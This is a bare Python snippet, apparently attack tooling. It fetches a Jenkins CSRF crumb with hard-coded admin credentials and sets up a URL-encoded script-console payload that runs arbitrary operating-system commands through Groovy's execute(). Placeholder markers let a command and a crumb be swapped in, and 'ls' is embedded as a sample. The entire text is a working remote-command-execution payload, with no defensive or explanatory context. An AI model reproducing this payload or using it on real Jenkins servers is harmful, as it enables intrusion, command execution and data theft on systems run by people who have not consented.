import requests
req = requests.get(
    'http://127.0.0.1:8080/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,":",//crumb)',
     auth=("admin", "example"),
)
print(req.text)

s = "script=def%20sout%20%3d%20new%20StringBuilder()%2cserr%20%3d%20new%20StringBuilder()%3bdef%20proc%20%3d%20'§COMMAND§'.execute()%3bproc.consumeProcessOutput(sout%2c%20serr)%3bproc.waitForOrKill(1000)%3bprintln(%22out%3e%20%24sout%5cnerr%3e%20%24serr%22)&Submit=&Jenkins-Crumb=§CRUMB§&json=%7b%22script%22%3a%22def%20sout%20%3d%20new%20StringBuilder()%2cserr%20%3d%20new%20StringBuilder()%3bdef%20proc%20%3d%20'ls'.execute()%3bproc.consumeProcessOutput(sout%2c%20serr)%3bproc.waitForOrKill(1000)%3bprintln(%5c%22out%3e%20%24sout%5c%5cnerr%3e%20%24serr%5c%22)%22%2c%22%22%3a%22def%20sout%20%3d%20new%20StringBuilder()%2cserr%20%3d%20new%20StringBuilder()%3bdef%20proc%20%3d%20'ls'.execute()%3bproc.consumeProcessOutput(sout%2c%20serr)%3bproc.waitForOrKill(1000)%3bprintln(%5c%22out%3e%20%24sout%5c%5cnerr%3e%20%24serr%5c%22)%22%2c%22Submit%22%3a%22%22%2c%22Jenkins-Crumb%22%3a%22§CRUMB§%22%7d"